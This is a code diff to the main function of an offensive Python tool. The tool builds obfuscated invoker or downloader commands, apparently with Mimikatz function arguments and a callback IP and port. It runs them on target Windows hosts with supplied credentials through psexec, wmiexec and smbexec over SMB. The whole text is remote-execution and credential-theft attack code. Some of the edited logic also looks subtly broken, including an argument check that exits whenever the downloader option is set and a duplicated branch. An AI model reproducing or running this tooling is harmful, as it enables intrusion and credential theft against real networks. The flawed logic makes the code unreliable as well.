@@ -185,8 +185,8 @@ def main():
         parser.print_help()
         sys.exit(1)
 
-    if (args.payload == None and not args.downloader):
-        print("[!] This script requires either a download based attack or a payload for invokation")
+    if args.downloader or args.invoker and args.payload == None:
+        print("[!] This script requires either a command, an invoker attack, or a downloader attack")
         parser.print_help()
         sys.exit(1)
 
@@ -209,10 +209,9 @@ def main():
     dom = args.dom
     target = args.target
     command = args.command
+    execution = ""
     supplement = ""
 
-    if smbexec_cmd or wmiexec_cmd or atexec_cmd:
-        invoker = True
     if smbexec_cmd or wmiexec_cmd or atexec_cmd or psexec_cmd:
         if usr == None or pwd == None:
             print(2)
@@ -221,20 +220,22 @@ def main():
             print(1)
             sys.exit("[!] If you are trying to exploit a system you need at least one target")
 
-    x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
-
     if invoker:
         execution = "invoker"
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
         command = x.return_command()
-    elif downloader:
+    if downloader:
         execution = "downloader"
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
         command = x.return_command()
-    elif psexec_cmd:
+    elif psexec_cmd and invoker:
         execution = "psexec"
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
         command = x.return_command()
-    else:
-        parser.print_help()
-        sys.exit("[!] Please choose to execute either the invoker or the downloader")
+    elif invoker:
+        execution = "invoker"
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
+        command = x.return_command()
 
     gateways = get_gateways()
     network_ifaces = get_networks(gateways)
@@ -262,7 +263,7 @@ def main():
         attack=psexec.PSEXEC(command, path="C:\\", protocols="445/SMB", username = usr, password = pwd, domain = dom, copyFile = None, exeFile = None)
         attack.run(target)
     elif wmiexec_cmd:
-        attack=wmiexec.WMIEXEC(test, username = usr, password = pwd, domain = dom)
+        attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom)
         attack.run(target)
     elif smbexec_cmd:
         attack=smbexec.CMDEXEC(protocols = "445/SMB", username = usr, password = pwd, domain = dom)
